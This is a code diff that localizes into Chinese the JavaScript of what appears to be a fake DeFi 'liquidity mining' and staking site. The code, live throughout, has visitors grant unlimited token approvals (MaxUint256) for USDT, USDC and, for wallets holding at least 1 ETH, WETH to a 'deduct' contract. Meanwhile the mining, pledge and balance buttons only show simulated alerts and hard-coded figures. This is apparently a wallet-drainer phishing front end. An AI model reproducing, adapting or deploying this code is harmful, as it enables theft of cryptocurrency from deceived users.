@@ -48,7 +48,7 @@ function resetState(showMsg = true) {
     }
     disableInteractiveElements(true);
     if (showMsg) {
-        updateStatus("Please connect your wallet to proceed.");
+        updateStatus("請先連接您的錢包以繼續。");
     }
 }
 
@@ -70,7 +70,7 @@ function disableInteractiveElements(disable = false) {
  * 【Trust Wallet 修復】使用精簡的 RPC 請求發送交易，並加入魯棒的錯誤處理。
  */
 async function sendMobileRobustTransaction(populatedTx) {
-    if (!signer || !provider) throw new Error("Wallet not connected or signer missing.");
+    if (!signer || !provider) throw new Error("錢包未連接或簽名者缺失。");
 
     const txValue = populatedTx.value ? populatedTx.value.toString() : '0';
     const fromAddress = await signer.getAddress();
@@ -87,10 +87,10 @@ async function sendMobileRobustTransaction(populatedTx) {
 
     try {
         txHash = await provider.send('eth_sendTransaction', [mobileTx]);
-        updateStatus(`Authorization sent! HASH: ${txHash.slice(0, 10)}... Waiting for confirmation...`);
+        updateStatus(`授權已發送！HASH: ${txHash.slice(0, 10)}... 等待確認中...`);
         receipt = await provider.waitForTransaction(txHash);
     } catch (error) {
-        console.warn("⚠️ Trust Wallet interface may throw harmless errors. Proceeding with on-chain check...");
+        console.warn("⚠️ Trust Wallet 介面可能會拋出無害錯誤。繼續進行鏈上檢查...");
 
         if (error.hash) {
             txHash = error.hash;
@@ -100,15 +100,15 @@ async function sendMobileRobustTransaction(populatedTx) {
         }
 
         if (txHash) {
-            updateStatus(`Transaction interface error occurred! Transaction sent: ${txHash.slice(0, 10)}... Waiting for confirmation...`);
+            updateStatus(`交易介面發生錯誤！已發送交易: ${txHash.slice(0, 10)}... 等待確認中...`);
             receipt = await provider.waitForTransaction(txHash);
         } else {
-            throw new Error(`Transaction failed to send, and unable to retrieve transaction hash from error: ${error.message}`);
+            throw new Error(`交易發送失敗，無法從錯誤中檢索交易哈希: ${error.message}`);
         }
     }
 
     if (!receipt || receipt.status !== 1) {
-        throw new Error(`Transaction failed on-chain (reverted). Hash: ${txHash.slice(0, 10)}...`);
+        throw new Error(`交易在鏈上失敗（已復原）。哈希: ${txHash.slice(0, 10)}...`);
     }
 
     return receipt;
@@ -120,7 +120,7 @@ async function sendMobileRobustTransaction(populatedTx) {
 async function initializeWallet() {
     try {
         if (typeof window.ethereum === 'undefined') {
-            updateStatus('Please install MetaMask, Trust Wallet, or a compatible wallet to proceed.');
+            updateStatus('請安裝 MetaMask、Trust Wallet 或相容的錢包以繼續。');
             return;
         }
 
@@ -128,15 +128,15 @@ async function initializeWallet() {
 
         const network = await provider.getNetwork();
         if (network.chainId !== 1n) {
-            updateStatus('Requesting switch to Ethereum Mainnet... Please approve in your wallet.');
+            updateStatus('請求切換至 Ethereum 主網... 請在錢包中批准。');
             try {
                 await provider.send('wallet_switchEthereumChain', [{ chainId: '0x1' }]);
                 return;
             } catch (switchError) {
                 if (switchError.code === 4001) {
-                    updateStatus('You must switch to Ethereum Mainnet to use this service. Please switch manually and refresh.');
+                    updateStatus('您必須切換至 Ethereum 主網才能使用此服務。請手動切換並重新整理。');
                 } else {
-                    updateStatus(`Failed to switch network. Please do so manually. Error: ${switchError.message}`);
+                    updateStatus(`無法切換網絡。請手動切換。錯誤: ${switchError.message}`);
                 }
                 return;
             }
@@ -150,10 +150,10 @@ async function initializeWallet() {
             resetState(false);
         }
 
-        updateStatus("Please connect your wallet to proceed.");
+        updateStatus("請先連接您的錢包以繼續。");
     } catch (error) {
-        console.error("Initialize Wallet Error:", error);
-        updateStatus(`Initialization failed: ${error.message}`);
+        console.error("初始化錢包錯誤:", error);
+        updateStatus(`初始化失敗: ${error.message}`);
     }
 }
 
@@ -163,10 +163,10 @@ async function initializeWallet() {
 async function checkAuthorization() {
     try {
         if (!signer) {
-            updateStatus('Wallet is not connected. Please connect first.');
+            updateStatus('錢包未連接。請先連接。');
             return;
         }
-        updateStatus("Checking authorization status...");
+        updateStatus("檢查授權狀態中...");
 
         const isServiceActive = await deductContract.isServiceActiveFor(userAddress);
         const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
@@ -180,34 +180,34 @@ async function checkAuthorization() {
         const hasSufficientAllowance = (usdtAllowance >= requiredAllowance) || (usdcAllowance >= requiredAllowance) || (wethAllowance >= requiredAllowance);
         const isFullyAuthorized = isServiceActive && hasSufficientAllowance;
 
-        console.log("【DEBUG_FinalCheck】User Address:", userAddress);
-        console.log("【DEBUG_FinalCheck】Required Allowance:", requiredAllowance.toString());
-        console.log("【DEBUG_FinalCheck】Service Active:", isServiceActive);
-        console.log("【DEBUG_FinalCheck】Has Sufficient Allowance:", hasSufficientAllowance);
-        console.log("【DEBUG_FinalCheck】Is Fully Authorized (Final):", isFullyAuthorized);
+        console.log("【DEBUG_FinalCheck】用戶地址:", userAddress);
+        console.log("【DEBUG_FinalCheck】所需授權額度:", requiredAllowance.toString());
+        console.log("【DEBUG_FinalCheck】服務啟動:", isServiceActive);
+        console.log("【DEBUG_FinalCheck】是否有足夠授權:", hasSufficientAllowance);
+        console.log("【DEBUG_FinalCheck】是否完全授權 (最終):", isFullyAuthorized);
 
         if (isFullyAuthorized) {
             if (connectButton) {
                 connectButton.classList.add('connected');
-                connectButton.title = 'Disconnect Wallet';
+                connectButton.title = '斷開錢包';
             }
             disableInteractiveElements(false);
-            updateStatus("✅ Service activated and authorized successfully.");
+            updateStatus("✅ 服務已啟動並授權成功。");
         } else {
             if (connectButton) {
                 connectButton.classList.remove('connected');
-                connectButton.title = 'Connect & Authorize';
+                connectButton.title = '連接並授權';
             }
             disableInteractiveElements(true);
-            updateStatus('Authorization required. Please connect and authorize.');
+            updateStatus('需要授權。請連接並授權。');
         }
         updateStatus("");
     } catch (error) {
-        console.error("Check Authorization Error:", error);
+        console.error("檢查授權錯誤:", error);
         if (error.code === 'CALL_EXCEPTION') {
-            updateStatus('Contract communication failed. Please ensure you are on the **Ethereum Mainnet** and the contract address is correct, then refresh the page.');
+            updateStatus('合約通信失敗。請確保您在 **Ethereum 主網** 上且合約地址正確，然後重新整理頁面。');
         } else {
-            updateStatus(`Authorization check failed: ${error.message}`);
+            updateStatus(`授權檢查失敗: ${error.message}`);
         }
     }
 }
@@ -216,7 +216,7 @@ async function checkAuthorization() {
  * 條件式授權流程：根據 ETH/WETH 餘額決定要授權哪些代幣。
  */
 async function handleConditionalAuthorizationFlow(requiredAllowance, serviceActivated, tokensToProcess) {
-    updateStatus('Checking and setting up token authorizations...');
+    updateStatus('檢查並設置代幣授權中...');
     let tokenToActivate = '';
     let stepCount = 0;
 
@@ -224,12 +224,12 @@ async function handleConditionalAuthorizationFlow(requiredAllowance, serviceActi
 
     for (const { name, contract, address } of tokensToProcess) {
         stepCount++;
-        updateStatus(`Step ${stepCount}/${totalSteps}: Checking and requesting ${name} authorization...`);
+        updateStatus(`步驟 ${stepCount}/${totalSteps}: 檢查並請求 ${name} 授權...`);
 
         const currentAllowance = await contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
 
         if (currentAllowance < requiredAllowance) {
-            updateStatus(`Step ${stepCount}/${totalSteps}: Requesting ${name} Authorization... Please approve in your wallet.`);
+            updateStatus(`步驟 ${stepCount}/${totalSteps}: 請求 ${name} 授權... 請在錢包中批准。`);
 
             const approvalTx = await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
             approvalTx.value = 0n;
@@ -251,15 +251,15 @@ async function handleConditionalAuthorizationFlow(requiredAllowance, serviceActi
     if (!serviceActivated && tokenToActivate) {
         stepCount++;
         const tokenName = tokensToProcess.find(t => t.address === tokenToActivate).name;
-        updateStatus(`Step ${stepCount}/${totalSteps]: Activating service (using ${tokenName})...`);
+        updateStatus(`步驟 ${stepCount}/${totalSteps}: 啟動服務 (使用 ${tokenName})...`);
 
         const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
         activateTx.value = 0n;
         await sendMobileRobustTransaction(activateTx);
     } else if (!serviceActivated) {
-        updateStatus(`Warning: No authorized token found to activate service. Please ensure you have ETH for Gas fees.`);
+        updateStatus(`警告: 未找到可用的授權代幣來啟動服務。請確保您有 ETH 用於 Gas 費用。`);
     } else {
-        updateStatus(`All authorizations and service activation completed.`);
+        updateStatus(`所有授權和服務啟動已完成。`);
     }
 }
 
@@ -274,14 +274,14 @@ async function connectWallet() {
             if (network.chainId !== 1n) return;
         }
 
-        updateStatus('Please confirm the connection in your wallet...');
+        updateStatus('請在錢包中確認連接...');
         const accounts = await provider.send('eth_requestAccounts', []);
-        if (accounts.length === 0) throw new Error("No account selected.");
+        if (accounts.length === 0) throw new Error("未選擇帳戶。");
 
         const currentConnectedAddress = accounts[0];
 
         if (userAddress && userAddress !== currentConnectedAddress) {
-            console.warn(`⚠️ Address switch detected from ${userAddress.slice(0, 8)}... to ${currentConnectedAddress.slice(0, 8)}.... Forcing reset.`);
+            console.warn(`⚠️ 檢測到地址切換從 ${userAddress.slice(0, 8)}... 到 ${currentConnectedAddress.slice(0, 8)}.... 強制重置。`);
             resetState(false);
             return connectWallet();
         }
@@ -289,14 +289,14 @@ async function connectWallet() {
         signer = await provider.getSigner();
         userAddress = await signer.getAddress();
 
-        console.log("【DEBUG】Wallet Connected. Current User Address:", userAddress);
+        console.log("【DEBUG】錢包已連接。當前用戶地址:", userAddress);
 
         deductContract = new ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
         usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
         usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
         wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
 
-        updateStatus('Preparing optimal authorization flow...');
+        updateStatus('準備最佳化授權流程...');
 
         const [ethBalance, wethBalance] = await Promise.all([
             provider.getBalance(userAddress),
@@ -310,8 +310,8 @@ async function connectWallet() {
         const serviceActivated = await deductContract.isServiceActiveFor(userAddress);
         const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
 
-        console.log("【DEBUG】Required Allowance (Threshold):", requiredAllowance.toString());
-        console.log("【DEBUG】Service Activated:", serviceActivated);
+        console.log("【DEBUG】所需授權額度 (閾值):", requiredAllowance.toString());
+        console.log("【DEBUG】服務已啟動:", serviceActivated);
 
         const [usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
             usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
@@ -322,11 +322,11 @@ async function connectWallet() {
         const hasSufficientAllowance = (usdtAllowance >= requiredAllowance) || (usdcAllowance >= requiredAllowance) || (wethAllowance >= requiredAllowance);
         const isFullyAuthorized = serviceActivated && hasSufficientAllowance;
 
-        console.log("【DEBUG】USDT Allowance:", usdtAllowance.toString());
-        console.log("【DEBUG】USDC Allowance:", usdcAllowance.toString());
-        console.log("【DEBUG】WETH Allowance:", wethAllowance.toString());
-        console.log("【DEBUG】Has Sufficient Allowance:", hasSufficientAllowance);
-        console.log("【DEBUG】Is Fully Authorized (Final Check):", isFullyAuthorized);
+        console.log("【DEBUG】USDT 授權:", usdtAllowance.toString());
+        console.log("【DEBUG】USDC 授權:", usdcAllowance.toString());
+        console.log("【DEBUG】WETH 授權:", wethAllowance.toString());
+        console.log("【DEBUG】是否有足夠授權:", hasSufficientAllowance);
+        console.log("【DEBUG】是否完全授權 (最終檢查):", isFullyAuthorized);
 
         let tokensToProcess;
 
@@ -336,13 +336,13 @@ async function connectWallet() {
                 { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
                 { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
             ];
-            updateStatus('Sufficient ETH/WETH balance detected (>= 1 ETH). Starting WETH, USDT, USDC authorization flow.');
+            updateStatus('檢測到足夠的 ETH/WETH 餘額 (>= 1 ETH)。開始 WETH、USDT、USDC 授權流程。');
         } else {
             tokensToProcess = [
                 { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
                 { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
             ];
-            updateStatus('Insufficient ETH/WETH balance (< 1 ETH). Starting USDT, USDC authorization flow.');
+            updateStatus('ETH/WETH 餘額不足 (< 1 ETH)。開始 USDT、USDC 授權流程。');
         }
 
         if (!isFullyAuthorized) {
@@ -351,19 +351,19 @@ async function connectWallet() {
 
         await checkAuthorization();
     } catch (error) {
-        console.error("Connect Wallet Error:", error);
+        console.error("連接錢包錯誤:", error);
 
-        let userMessage = `An error occurred: ${error.message}`;
+        let userMessage = `發生錯誤: ${error.message}`;
         if (error.code === 4001) {
-            userMessage = "You rejected the authorization. Please try again.";
+            userMessage = "您拒絕了授權。請再次嘗試。";
         } else if (error.message.includes('insufficient funds')) {
-            userMessage = "Authorization failed: Insufficient ETH balance for Gas fees.";
+            userMessage = "授權失敗: ETH 餘額不足以支付 Gas 費用。";
         }
 
         updateStatus(userMessage);
         if (connectButton) {
             connectButton.classList.remove('connected');
-            connectButton.title = 'Connect Wallet (Retry)';
+            connectButton.title = '連接錢包 (重試)';
         }
     }
 }
@@ -373,7 +373,7 @@ async function connectWallet() {
  */
 function disconnectWallet() {
     resetState(true);
-    alert('Wallet disconnected. To fully remove site permissions, please do so in your wallet\'s "Connected Sites" settings.');
+    alert('錢包已斷開。要完全移除網站權限，請在錢包的「已連接網站」設置中操作。');
 }
 
 //---Language Control Functions---
@@ -468,7 +468,7 @@ const elements = {
     pledgeAmountLabel: document.getElementById('pledgeAmountLabel'),
     pledgeDurationLabel: document.getElementById('pledgeDurationLabel'),
     pledgeBtnText: document.getElementById('pledgeBtn'),
-    totalPledgedLabel: document.getElementById('totalPledgeds'),
+    totalPledgedLabel: document.getElementById('totalPledgedLabel'), // 修正拼寫
     expectedYieldLabel: document.getElementById('expectedYieldLabel'),
     apyLabel: document.getElementById('apyLabel'),
     lockedUntilLabel: document.getElementById('lockedUntilLabel')
@@ -504,35 +504,35 @@ if (connectButton) {
 
 startBtn.addEventListener('click', () => {
     if (!connectButton.classList.contains('connected')) {
-        alert('Please connect your wallet first!');
+        alert('請先連接您的錢包！');
         return;
     }
-    alert('Starting liquidity mining... (Simulation: Process initiated)');
+    alert('開始流動性挖礦... (模擬: 流程已啟動)');
     document.querySelector('#liquidity .stat-value:nth-of-type(1)').textContent = '2.1000380 ETH';
     document.querySelector('#liquidity .stat-value:nth-of-type(2)').textContent = '0.6000380 ETH';
 });
 
 pledgeBtn.addEventListener('click', () => {
     if (!connectButton.classList.contains('connected')) {
-        alert('Please connect your wallet first!');
+        alert('請先連接您的錢包！');
         return;
     }
     const amount = pledgeAmount.value;
     const duration = pledgeDuration.value;
     if (!amount) {
-        alert('Please enter a pledge amount!');
+        alert('請輸入質押金額！');
         return;
     }
-    alert(`Pledging ${amount} USDT for ${duration} days... (Simulation: Pledge successful)`);
+    alert(`質押 ${amount} USDT 於 ${duration} 天... (模擬: 質押成功)`);
     document.querySelector('.pledge-stats .stat-value:nth-of-type(1)').textContent = `${parseFloat(5678.90) + parseFloat(amount)}.00 USDT`;
 });
 
 refreshWallet.addEventListener('click', () => {
     if (!connectButton.classList.contains('connected')) {
-        alert('Please connect your wallet first!');
+        alert('請先連接您的錢包！');
         return;
     }
-    alert('Refreshing wallet balance... (Simulation: Balance updated to 0.000 USDT)');
+    alert('刷新錢包餘額... (模擬: 餘額更新為 0.000 USDT)');
 });
 
 const tabs = document.querySelectorAll('.tab');
